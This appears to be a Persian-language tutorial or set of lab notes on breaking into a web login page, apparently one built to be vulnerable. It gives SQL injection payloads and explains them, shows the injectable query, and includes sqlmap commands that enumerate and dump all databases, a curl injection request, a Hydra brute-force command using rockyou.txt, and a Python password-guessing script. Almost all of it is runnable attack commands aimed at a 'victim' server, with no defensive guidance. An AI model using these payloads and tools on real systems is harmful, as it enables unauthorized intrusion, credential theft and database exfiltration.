```
admin' --
123
```

```
' OR '1'='1' --
123
```

<p dir="rtl" align="justify">
  <ul dir="rtl">
  <li>' : اولین تک کوتیشن، این کار باعث بسته شدن رشته ورودی username می‌شود.</li>
	<li>-- : یک کامنت در SQL است که بقیه کوئری را نادیده می‌گیرد</li>
	<li>نتیجه این می‌شود که شرط WHERE همیشه درست خواهد بود و کوئری اولین کاربر از جدول را برمی‌گرداند (معمولاً کاربر مدیر).</li>
	<li>OR '1'='1' : یک شرط همیشه درست اضافه می‌کند (1 همیشه برابر با 1 است)</li>
  </ul>
</p>


```sql
SELECT * FROM auth_user  WHERE username='{username}' AND password='{password}'
```
```sql
SELECT * FROM vuln_app_user WHERE username='' OR '1'='1' -- ' AND password='...'
```

<p dir="rtl" align="justify">نتیجه نهایی:</p>

```sql
SELECT * FROM auth_user WHERE username='' OR '1'='1'
```

# sqlmap

1. نصب sqlmap (اگر وجود ندارد):
```
sudo apt update && sudo apt install sqlmap
```

2. اجرای حمله به صفحه لاگین:

```
sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&password=123" --method=POST --risk=3 --level=5 --dbs
```

--data: پارامترهای POST ارسالی.
--dbs: لیست پایگاه‌های داده را نمایش می‌دهد.

برای حمله پیشرفته‌تر:

```
sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&password=123" --method=POST --dump-all
```

# curl

```
curl -X POST "http://IP-سرور-قربانی/login/" -d "username=' OR '1'='1' --&password=123"
```


# Brute Force

۱. با ابزارهای خودکار (مثل Hydra یا Burp Intruder)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt victim-ip http-post-form "/login:username=^USER^&password=^PASS^:F=login_failed.html"
```

-l admin: نام کاربری هدف.
-P rockyou.txt: لیست پسوردهای معروف.
http-post-form: نوع حمله (POST).
F=login_failed.html: شرط تشخیص شکست (اگر این صفحه نمایش داده شد، پسورد اشتباه است).

2.  با یک اسکریپت پایتون ساده (اگر می‌خواهید خودتان بنویسید)


```python
import requests

target_url = "http://victim-ip/login/"
username = "admin"
passwords = ["123456", "password", "admin123", "123"]  # یا از یک فایل بخوانید

for password in passwords:
    data = {"username": username, "password": password}
    response = requests.post(target_url, data=data)
    if "login_success" in response.text:
        print(f"✅ پسورد پیدا شد: {password}")
        break
    else:
        print(f"❌ امتحان شد: {password}")
```
